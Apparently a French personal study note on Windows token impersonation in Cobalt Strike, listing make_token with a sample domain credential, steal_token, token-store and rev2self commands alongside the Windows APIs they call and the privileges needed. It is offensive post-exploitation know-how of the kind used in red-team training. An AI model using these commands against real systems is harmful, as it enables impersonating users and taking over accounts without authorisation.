

Consiste à usurper le token d'accès d'un utilisateur. Le token peut être forgé avec les credentials de la victime ou bien volés dans un autre processus.


# Cobalt Strike

## Make Token

Forge un token à partir des credentials et usurpe l'utilisateur. (Utilise les API [LogonUserA](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera) et [ImpersonateLoggedOnUser](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser))

```
make_token CONTOSO\rsteel Passw0rd!
```

![[Pasted image 20250914194036.png]]

Stopper l'usurpation de l'utilisateur ([RevertToSelf](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself))

```
rev2self
```

## Steal Token

> [!Attention]
> Nécessite une session haute intégrité (privileges SYSTEM) ou le privilege SeDelegateSessionUserImpersonatePrivilege Enabled.

Vole le primary access token présent dans un processus.

- [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) pour obtenir le handle (référence, pointeur) du processus cible.
    
- [OpenProcessToken](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken) pour obtenir le handle (référence, pointeur) à son primary access token.
    
- [DuplicateToken](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetoken) pour dupliquer le primary token en impersonation token.
    
- [ImpersonateLoggedOnUser](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser) pour utiliser le impersonation token.


Afficher les processus

```
ps
```

Voler un token et usurper l'utilisateur avec steal_token. (Privilégier la commande token-store qui permet de réutiliser les token après fermeture du processus)

```
steal_token <pid>
```

Voler un token et l'ajouter au store

```
token-store steal <pid>
```

Afficher les token dans le store

```
token-store show
```

Utiliser un token

```
token-store use <id>
```

Supprimer un token du store

```
token-store remove <id>
```

Stopper l'usurpation de l'utilisateur ([RevertToSelf](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself))

```
rev2self
```





